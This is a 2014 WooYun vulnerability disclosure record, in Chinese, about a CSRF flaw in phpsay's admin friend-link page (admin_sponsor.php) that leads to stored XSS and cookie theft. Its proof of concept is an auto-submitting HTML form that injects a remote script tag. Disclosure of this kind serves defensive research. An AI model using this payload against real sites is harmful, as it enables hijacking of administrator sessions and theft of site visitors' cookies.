{"id": 51349, "wybug_id": "wooyun-2014-074868", "wybug_title": "phpsay 某功能csrf可产生存储xss", "wybug_corp": "phpsay.com", "wybug_author": "JJ Fly", "wybug_date": "2014-09-03 16:17", "wybug_open_date": "2014-11-29 16:18", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-08：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-29：\t细节向公众公开  简要描述： phpsay 某功能csrf可产生存储xss 详细说明：  后台添加友情链接处 http://localhost/admin_sponsor.php没有进行限制。可以csrf。而且对提交的参数未进行过滤。可以直接xss   漏洞证明：  1.先来发下构造好的 \nhttp://10.10.10.131/1.html<form method='post' action='http://localhost/admin_sponsor.php'><input value=\"Add\" name=\"do\"><input value=\"test\" name=\"text\"><input value='http://baidu.com\"/><script src=http://xxxxxx></script>' name='link'></form><script>document.forms[0].submit();</script>\n2.模拟情况管理员登录的状态下 访问恶意网站。。http://10.10.10.131/1.html  源码如上。然后在友情连接这就添加了一个链接\n\n\n\n添加的链接貌似在网站的任一页面都显示。。只要访问就可以获取到他的cookies。未使用http-only\n\n   修复方案：     版权声明：转载请注明来源 JJ Fly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-11-29 16:18 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}